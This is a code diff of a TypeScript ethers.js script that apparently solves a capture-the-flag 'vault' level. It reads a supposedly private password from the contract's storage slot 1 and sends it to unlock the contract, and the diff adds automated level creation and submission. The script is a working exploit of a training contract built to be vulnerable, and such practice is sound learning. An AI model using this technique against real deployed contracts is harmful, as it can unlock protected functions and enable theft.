@@ -2,21 +2,23 @@
 import { ethers, Signer } from "ethers";
 import { Interface } from "ethers/lib/utils";
 import { getSigner } from "./signer";
+import { createLevel, submitLevel } from "./utils";
 
 async function main() {
-  const instanceAddress = "0x167DDdE13a483987355f67137A3C70BD7359e07d";
+  
   const signer = getSigner();
-
+  const level = await createLevel(signer, 'vault');
 
   const passwordHex = await GetStorage(1);
   const ct = new Interface(abi);
   const data = ct.encodeFunctionData("unlock", [passwordHex]);
-  const tx = await signer.sendTransaction({ to: instanceAddress, data: data, gasLimit: 620000 });
+  const tx = await signer.sendTransaction({ to: level, data: data, gasLimit: 620000 });
   console.log(await tx.wait());
 
   async function GetStorage(position: number) {
-    return await signer.provider?.getStorageAt(instanceAddress, position) || "";
+    return await signer.provider?.getStorageAt(level, position) || "";
   }
+  await submitLevel(signer, level);
 }
 
 main()
